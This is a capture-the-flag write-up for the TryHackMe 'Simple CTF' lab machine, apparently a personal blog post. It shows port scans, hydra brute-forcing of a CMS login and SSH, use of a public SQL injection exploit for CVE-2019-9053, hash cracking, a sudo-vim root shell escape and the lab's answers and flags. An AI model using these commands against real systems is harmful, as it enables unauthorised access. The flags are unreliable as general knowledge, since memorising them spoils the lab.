---
title: Simple CTF
date: 2022-05-07 17:00:00 +500
categories: [THM, easy machines]
tags: [hash]    # TAG names should always be lowercase
---


### How many services are running under port 1000?

Let's run Nmap:

```terminal
nmap -p- --open -n -v 10.10.228.206
```

```
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

> 2

### What is running on the higher port?

We don't know which service is running on port 2222, so let's find out what it is and check the other ports while we're at it.

```terminal
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

> ssh

### What's the CVE you're using against the application?

now time to investigate the service, the FTP server accepted Anonymous login, and was only one file which was a note for Mitch a possible credential.

```
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

and we know that he uses the same password for everything and it's weak.

The next step was to search domains on the web page, that had only the default Apache screen. I found /robots.txt 

```
Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```

with a directory that was nothing, and a line of command of Linux? looks like mike is a user, maybe he's mitch.

the other directory that gobuster found was /simple a content management system like WordPress. It's the default after-installation page, it has a post made by mitch so now we know that is the user. And in the page says that the administration console is under 'http://yourwebsite.com/cmsmspath/admin' with a redirect link, Let's try to brute force with hydra since the note said that his password is weak.

set up the hydra command:

syntax 
``` terminal 
hydra -l <USER> -p <Password> <IP Address> http-post-form “<Login Page>:<Request Body>:<Error Message>”
```

* Login page
  /simple/admin/login.php
* Request Body
  username=^USER^&password=^PWD^&loginsubmit=Submit
* Error message
  User name or password incorrect

```terminal
hydra -l mitch -P /usr/share/wordlists/rockyou.txt 10.10.228.206 http-post-form "/simple/admin/login.php:username=^USER^&password=^PWD^&loginsubmit=Submit:User name or password incorrect"
```

it didn't find the password nor for mike, so at this point, I realized I have lost course, the question was what CVE is this application vulnerable to, so I looked up the cms version, and I found it's vulnerable to SQL injection, the first thing I did after this was to try some payloads like "'OR 1=1 --" but no luck.

> CVE-2019-9053

### To what kind of vulnerability is the application vulnerable?

> sqli

### What's the password?

The first thing after searching for the CMS version was an exploit written in Python, so I downloaded it, wasn't working at first because it looked like was written for python2, but running it with python2 it said it couldn't find a library, so I tried to make it work with python3, all I needed to do was adding () to the prints.

exploit: https://www.exploit-db.com/exploits/46635

this is the output:
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

this confirms mitch user, and we get a password, that looks like its encrypted, anyway, it tried and it didn't work, so now I was looking to crack it, I tried with hashcat but nothing was working, tried with the salt, without it, different modes, even with the wordlist that recommended the hint.

after this, I gave up on the site and tried to bruteforce ssh, since the note said he uses the same password.
*changing the port with the -s flag since the ssh service was on that port

```terminal
hydra -l mitch -P /usr/share/wordlists/best110.txt 10.10.228.206 -s 2222 ssh
```

and I got a password!


> secret

*the intended way was indeed using hashcat with a config I'm pretty sure I used but maybe I made a typo, who knows
```terminal
hashcat -O -m 20 -a 0 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/best110.txt
```

### Where can you login with the details obtained?

Now this feels strange because the answer is ssh but I actually got it from brute forcing this service and not the intended way of the vulnerability on the CMS page.

> ssh

### What's the user flag?

log into the ssh

```terminal
ssh mitch@10.10.228.206 -p 2222
```

the file is right there: user.txt

> G00d j0b, keep up!

### Is there any other user in the home directory? What's its name?

ls /home

> sunbath

### What can you leverage to spawn a privileged shell?

run sudo -l to see what I can run as sudo, and it's vim, I head over gtfobin pretty sure that this can spawn a root shell.

and indeed, with this command, I got instantly a root shell

```terminal
sudo vim -c ':!/bin/sh'
```

### What's the root flag?

cat /root/root.txt

> W3ll d0n3. You made it!
